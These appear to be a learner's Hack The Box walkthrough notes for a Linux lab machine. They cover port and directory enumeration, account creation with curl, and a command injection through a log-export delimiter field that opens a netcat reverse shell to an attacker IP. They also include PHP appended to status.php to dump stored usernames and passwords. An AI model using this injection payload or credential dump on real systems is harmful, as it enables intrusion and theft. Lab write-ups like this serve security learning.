### Box Info
OS: Linux\
IP: 10.10.11.104

## Part I 

### Skills learned:
Curl/Python
CMD injection

### Enumeration
nmap -p- -A -oN Exploreprts.txt ${IP}
+ 22 OpenSSH
+ 80 Apache httpd 2.4.29 


### Dirb ${IP}/ -X .php
+ /accounts.php
    + Ability to create UN && PW            
+ /login.php
+ /status.php

### Step 1: User Account
+ Create account with curl request
  + curl -is -X POST -d "username=${UN}&password=${PW}&confirm=${PW}" ${IP}/accounts.php 
+ Login with new account:
  + Upload access, "MySQL server is online and connected", 3(2) registered admins, *sitebackup.zip*, User: m4lware
  + Management Menu -> Request Log Data: file delimeter

### Step 2: CMD Injection
+ inspect file delimeter
  + change comma to inlcude a nc shell
    + comma && nc -e /bin/sh ${AttackerIP} ${port#}
  + setup a listner shell : nc -lnp ${port#}

### Step 3: Shell
+ python -V
+ check https://github.com/crcirq32/Bash/blob/main/reverseshells.sh to upgrade shell
+ m4lwhere seems to house all permissions
  + Must access users from db to get more info on m4lwhere
    + append to status.php
    + printf("<?php\n$db = connectDB();\n$query = "SELECT username, password FROM accounts";\n$users = $db->query($query);\nif ($users->num_rows > 0) {\nwhile($row = mysqli_fetch_assoc($users)) {\nvar_dump($row);\n}\n}\n$db->close();") >> status.php

TODO: 10.10.11.104 Hung up - Stuck in limbo. Contact HTB
